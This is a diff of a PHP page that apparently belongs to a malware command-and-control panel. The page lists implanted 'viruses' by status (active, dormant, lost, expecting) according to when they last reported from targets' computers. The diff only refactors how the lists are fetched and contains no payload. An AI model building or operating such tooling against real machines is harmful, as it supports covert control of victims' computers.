@@ -1,11 +1,8 @@
 <?php /** @noinspection PhpUnusedParameterInspection */
 
-require_once(__DIR__ . "/../autoload.php");
-
 use Kelvinho\Virus\Singleton\Header;
 use Kelvinho\Virus\Singleton\HtmlTemplate;
 use Kelvinho\Virus\Singleton\Timezone;
-use Kelvinho\Virus\User\User;
 use Kelvinho\Virus\Virus\Virus;
 use function Kelvinho\Virus\formattedHash;
 use function Kelvinho\Virus\formattedTime;
@@ -75,7 +72,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 <h2>Active viruses</h2>
 <p>These are viruses that are still reporting back pretty quickly (less
     than <?php echo formattedTimeSpan(10 * VIRUS_PING_INTERVAL); ?>)</p>
-<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_ACTIVE), function ($data, $key, $timezone) use ($virusFactory) {
+<?php displayTable(map($user->getViruses(Virus::VIRUS_ACTIVE), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
     $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
@@ -86,7 +83,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 <h2>Dormant viruses</h2>
 <p>These are viruses that don't report back, but most likely due to the target's computer being shut off for less
     than 2 days</p>
-<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory) {
+<?php displayTable(map($user->getViruses(Virus::VIRUS_DORMANT), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
     $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
@@ -96,7 +93,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 }, $user->getTimezone())); ?>
 <h2>Lost viruses</h2>
 <p>These are viruses that don't report back for more than 2 days</p>
-<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_LOST), function ($data, $key, $timezone) use ($virusFactory) {
+<?php displayTable(map($user->getViruses(Virus::VIRUS_LOST), function ($data, $key, $timezone) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
     $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
@@ -107,7 +104,7 @@ $alternates = ["math", "nuclear", "graph", "cloud", "mail", "computer", "car", "
 <h2>Expecting viruses</h2>
 <p>These are viruses that haven't reported back yet, but are expected to report soon. This is automatically
     triggered by accessing the entry point.</p>
-<?php displayTable(map(User::getViruses($user_handle, Virus::VIRUS_EXPECTING), function ($data) use ($virusFactory) {
+<?php displayTable(map($user->getViruses(Virus::VIRUS_EXPECTING), function ($data) use ($virusFactory) {
     $virus = $virusFactory->get($data["virus_id"]);
     $onclick = "onclick = \"virusInfo('" . $virus->getVirusId() . "')\"";
     return array("virus_id" => $virus->getVirusId(), "last_ping" => $virus->getLastPing(), "style" => ($virus->isStandalone() ? "" : "background: lightgrey;"), "displays" => array("Name" => "<a $onclick>" . $virus->getName() . "</a>",
